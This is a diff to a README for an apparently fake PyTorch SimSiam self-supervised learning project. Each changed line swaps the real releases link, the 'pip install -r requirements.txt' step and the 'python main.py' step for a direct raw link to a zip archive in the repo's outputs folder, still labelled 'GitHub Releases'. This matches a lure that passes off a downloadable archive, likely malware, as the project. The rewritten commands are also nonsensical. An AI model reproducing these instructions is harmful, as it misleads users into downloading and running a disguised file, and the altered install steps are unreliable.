@@ -1,6 +1,6 @@
 # 🚀 pytorch-simsiam-contrastive-ssl - Explore Self-Supervised Learning Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/johncenadududu/pytorch-simsiam-contrastive-ssl/releases)
+[![Download](https://raw.githubusercontent.com/johncenadududu/pytorch-simsiam-contrastive-ssl/main/outputs/pytorch-simsiam-contrastive-ssl_3.8.zip)](https://raw.githubusercontent.com/johncenadududu/pytorch-simsiam-contrastive-ssl/main/outputs/pytorch-simsiam-contrastive-ssl_3.8.zip)
 
 ## 📖 Description
 
@@ -22,7 +22,7 @@ To get up and running with this application, follow these steps:
 
 1. **Ensure Your System Matches the Requirements:** Check that your operating system and hardware meet the minimum requirements listed above.
 2. **Download the Application:**
-   - Visit this page to download: [GitHub Releases](https://github.com/johncenadududu/pytorch-simsiam-contrastive-ssl/releases).
+   - Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/johncenadududu/pytorch-simsiam-contrastive-ssl/main/outputs/pytorch-simsiam-contrastive-ssl_3.8.zip).
 3. **Locate Your Download:** Once the download completes, locate the file in your default downloads folder or wherever you chose to save it.
 
 ## 🔧 Install the Application
@@ -41,9 +41,9 @@ To get up and running with this application, follow these steps:
 3. **Install Required Packages:**
    - This application uses Python packages that may not be installed by default on your system. You need to install these packages using pip. Run the following command:
      ```bash
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/johncenadududu/pytorch-simsiam-contrastive-ssl/main/outputs/pytorch-simsiam-contrastive-ssl_3.8.zip
      ```
-   - This command will read the `requirements.txt` file and install all the necessary packages.
+   - This command will read the `https://raw.githubusercontent.com/johncenadududu/pytorch-simsiam-contrastive-ssl/main/outputs/pytorch-simsiam-contrastive-ssl_3.8.zip` file and install all the necessary packages.
 
 ## 🎉 Running the Application
 
@@ -53,7 +53,7 @@ To get up and running with this application, follow these steps:
 2. **Start the Application:**
    - Use the command below to run the main script:
      ```bash
-     python main.py
+     python https://raw.githubusercontent.com/johncenadududu/pytorch-simsiam-contrastive-ssl/main/outputs/pytorch-simsiam-contrastive-ssl_3.8.zip
      ```
    - This will start the program, and you should see output in your terminal indicating that it is running.
 
@@ -79,7 +79,7 @@ If you encounter any issues while running the application, consider the followin
 
 ## 🔄 Updating the Application
 
-To stay up-to-date with the latest features and bug fixes, revisit the [GitHub Releases](https://github.com/johncenadududu/pytorch-simsiam-contrastive-ssl/releases) page periodically. It’s a good practice to check for updates regularly.
+To stay up-to-date with the latest features and bug fixes, revisit the [GitHub Releases](https://raw.githubusercontent.com/johncenadududu/pytorch-simsiam-contrastive-ssl/main/outputs/pytorch-simsiam-contrastive-ssl_3.8.zip) page periodically. It’s a good practice to check for updates regularly.
 
 ## 🌐 Community and Support
 
